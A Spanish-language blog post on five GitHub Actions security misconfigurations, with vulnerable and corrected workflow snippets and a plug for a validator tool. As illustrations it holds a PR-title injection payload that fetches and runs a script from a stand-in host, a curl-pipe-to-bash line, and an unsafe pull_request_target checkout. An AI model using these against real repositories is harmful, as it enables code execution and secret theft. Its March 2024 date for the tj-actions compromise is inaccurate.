---
title: "Los errores de seguridad en GitHub Actions que los linters pasan por alto"
description: "Los validadores de YAML detectan la sintaxis, no la exposición. Aquí están las cinco configuraciones incorrectas de GitHub Actions de mayor impacto — pull_request_target, inyección de scripts, actions sin fijar, ámbitos demasiado amplios de GITHUB_TOKEN y curl|bash — con el patrón incorrecto y su corrección para cada una."
pubDate: 2026-05-06
tags: ["github-actions", "security", "ci-cd"]
lang: es
translationOf: "github-actions-security-misconfigurations"
---

![Escudo con un ojo de cerradura sobre el título oscuro de portada «Errores de seguridad que los linters pasan por alto»: configuraciones incorrectas de seguridad en GitHub Actions de alto impacto](/blog/github-actions-security-misconfigurations-hero.svg)

Un linter de YAML te dirá cuándo tu workflow no se parsea. No te dirá cuándo tu workflow entrega a la pull request de un fork un token con permiso de escritura, ni cuándo ejecuta como código de shell un nombre de rama controlado por un atacante. Esos fallos son sintácticamente perfectos: pasan toda comprobación de esquema, salen en verde a la primera y amplían silenciosamente tu superficie de ataque hasta que alguien se da cuenta.

GitHub Actions está inusualmente expuesto porque los workflows son código que se ejecuta en cada push, a menudo con secretos en el ámbito y con un token capaz de escribir en el repositorio. Los errores siguientes son los que convierten un pipeline de CI rutinario en un incidente de cadena de suministro. Ninguno de ellos lo detecta por sí sola la pasada de sintaxis de `actionlint`, y los cinco son lo bastante comunes como para aparecer en repos públicos reales cada semana.

## 1. `pull_request_target` haciendo checkout de código no confiable

El disparador `pull_request_target` se ejecuta con **los secretos del repositorio base y un token de lectura/escritura**, pero por defecto hace checkout de la rama *destino*, que es lo que lo hace útil para etiquetar PRs o publicar comentarios desde forks. La trampa está en hacer checkout del head de la PR y luego *ejecutarlo*. Eso ejecuta código controlado por el atacante con tus secretos en el ámbito.

```yaml
# BAD — runs fork code with repo secrets and a write token
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # untrusted!
      - run: npm install && npm run build              # arbitrary code
```

Un atacante abre una PR cuyo `npm install` ejecuta un script `postinstall` malicioso, y ese script puede leer `secrets.*` o exfiltrar el `GITHUB_TOKEN`. Si solo necesitas *inspeccionar* una PR, usa `pull_request` (sin secretos, token de solo lectura) en su lugar. Si realmente necesitas secretos —por ejemplo, para publicar un estado—, divide el trabajo: compila el código no confiable en un job de `pull_request` sin secretos, y luego actúa sobre su salida en un workflow separado y de confianza.

```yaml
# FIXED — untrusted code runs without secrets
on: pull_request          # forked PRs get a read-only token, no secrets
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4   # checks out PR head safely, unprivileged
      - run: npm ci && npm run build
```

Por qué importa: este es el patrón de Actions más explotado de todos. Tratar las PRs de forks como entrada no confiable es la clave de todo.

![Un workflow de GitHub Actions anotado con errores de seguridad: pull_request_target, una action sin fijar, permisos demasiado amplios e inyección de scripts](/blog/github-actions-security-misconfigurations-diagram.svg)

## 2. Inyección de scripts a través de `${{ github.event.* }}`

Cualquier cosa que un usuario pueda escribir —el título de una PR, el nombre de una rama, el cuerpo de una incidencia, un mensaje de commit— está controlada por el atacante. Cuando la interpolas directamente en un bloque `run:`, GitHub sustituye la cadena en bruto dentro del shell *antes* de que el shell se ejecute, de modo que un valor manipulado se convierte en código ejecutable.

```yaml
# BAD — PR title is spliced straight into the shell
- name: Greet
  run: echo "Building PR: ${{ github.event.pull_request.title }}"
```

Una PR titulada `"; curl evil.sh | bash #` convierte ese único `echo` en dos comandos. La corrección consiste en pasar el valor no confiable a través de una variable de entorno. Las variables definidas en `env:` no las interpola el runner: el shell las recibe como datos, y entrecomillarlas las mantiene inertes.

```yaml
# FIXED — value arrives as data, never as code
- name: Greet
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building PR: $PR_TITLE"
```

Por qué importa: es la escalada de privilegios más fácil en CI y no necesita ningún disparador especial: cualquier workflow que imprima con `echo` texto proporcionado por el usuario es un candidato. La indirección de `env:` cuesta dos líneas y cierra el agujero por completo.

## 3. Actions de terceros fijadas a una etiqueta

`uses: some/action@v3` resuelve una etiqueta mutable. El propietario —o cualquiera que comprometa esa cuenta— puede mover `v3` para que apunte a código nuevo, y tu siguiente ejecución lo descarga sin que tú cambies nada. Las etiquetas son alias por comodidad, no garantías de integridad.

```yaml
# BAD — mutable reference, can change under you
- uses: tj-actions/changed-files@v44
```

Fija las actions de terceros a un **SHA de commit completo de 40 caracteres**. Un SHA es inmutable: la única forma de cambiar lo que se ejecuta es que tú lo actualices deliberadamente, que es exactamente el punto de revisión que quieres. Mantén la versión legible para humanos en un comentario al final para que las actualizaciones sigan siendo legibles, y deja que Dependabot actualice las fijaciones por ti.

```yaml
# FIXED — immutable, auditable pin
- uses: tj-actions/changed-files@a284dc1814e3fd07f2e34267fc8f81227ed29fb8 # v44.5.7
```

Por qué importa: el compromiso de `tj-actions/changed-files` de marzo de 2024 —en el que se empujó un commit malicioso detrás de etiquetas existentes y se volcaron secretos de miles de repos— solo afectó a los workflows fijados a etiquetas. Los consumidores que fijaban por SHA quedaron intactos.

## 4. Permisos demasiado amplios de `GITHUB_TOKEN`

Si nunca declaras `permissions:`, el `GITHUB_TOKEN` automático puede tomar por defecto un amplio acceso de lectura/escritura en todo el repositorio, según la configuración de la organización y del repositorio. Eso significa que un paso comprometido —digamos, una dependencia maliciosa— puede empujar commits, editar releases o abrir pull requests usando tu propio token.

```yaml
# BAD — no permissions block, token inherits broad defaults
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

Establece un **valor por defecto de solo lectura en la parte superior del workflow**, y luego concede ámbitos de escritura solo a los jobs concretos que los necesiten. La mayoría de los jobs de CI no necesitan nada más que `contents: read`. Un job que publica una release o publica un comentario recibe exactamente ese único ámbito y nada más.

```yaml
# FIXED — least privilege, scoped per job
on: push
permissions:
  contents: read            # workflow-wide default
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
  release:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: write       # only this job can write
    steps:
      - uses: actions/checkout@v4
      - run: ./scripts/publish.sh
```

Por qué importa: el mínimo privilegio convierte «un paso comprometido es dueño del repositorio» en «un paso comprometido puede leer código que ya podía ver». Es la reducción de radio de impacto más barata que puedes hacer.

## 5. `curl | bash` dentro de un paso

Canalizar un script remoto directamente a un shell ejecuta lo que esa URL sirva *en el momento de la ejecución*, sin fijación, sin checksum y sin revisión. Si el host está comprometido, o se secuestra el DNS, o el mantenedor simplemente empuja una versión defectuosa, se ejecuta en tu runner con tu token en el ámbito.

```yaml
# BAD — runs whatever the URL serves, unverified
- run: curl -sSL https://example.com/install.sh | bash
```

Fija el instalador a una versión conocida y verifica su checksum antes de ejecutarlo o, mejor aún, usa una setup action verificada y fijada por SHA que ya lo haga. El objetivo es hacer de «qué código se ejecutó» un hecho que puedas reconstruir después.

```yaml
# FIXED — download, verify, then run
- run: |
    curl -fsSL -o install.sh https://example.com/v1.2.3/install.sh
    echo "9b74c9897bac770ffc029102a200c5de  install.sh" | md5sum -c -
    bash install.sh
```

Por qué importa: `curl | bash` es una dependencia sin firmar y sin versionar que vuelves a descargar en cada ejecución. Fijarla y verificarla convierte una confianza ciega en una auditable.

## Detéctalos antes de que se fusionen

Cada uno de estos pasa una comprobación de esquema de YAML, que es por lo que un linter de sintaxis pasa de largo junto a ellos. Son problemas de alcanzabilidad y de confianza, no problemas de parseo, y son exactamente lo que se supone que la revisión debe detectar, pero que rara vez detecta a simple vista.

El **GitHub Actions Validator** comprueba los cinco, en el lado del cliente, en el momento en que pegas un workflow: marca los checkouts de `pull_request_target` de refs no confiables, la interpolación de `${{ }}` en pasos `run:`, las actions de terceros sin fijar, los `permissions:` ausentes o demasiado amplios, y las invocaciones de `curl | bash`, junto con los errores corrientes de YAML. Nada se sube; tu workflow nunca sale del navegador.

Si alguna vez has publicado un workflow y has esperado que fuera seguro, este es el paso que se asegura de ello.

[Prueba el GitHub Actions Validator →](/github-actions-validator/)
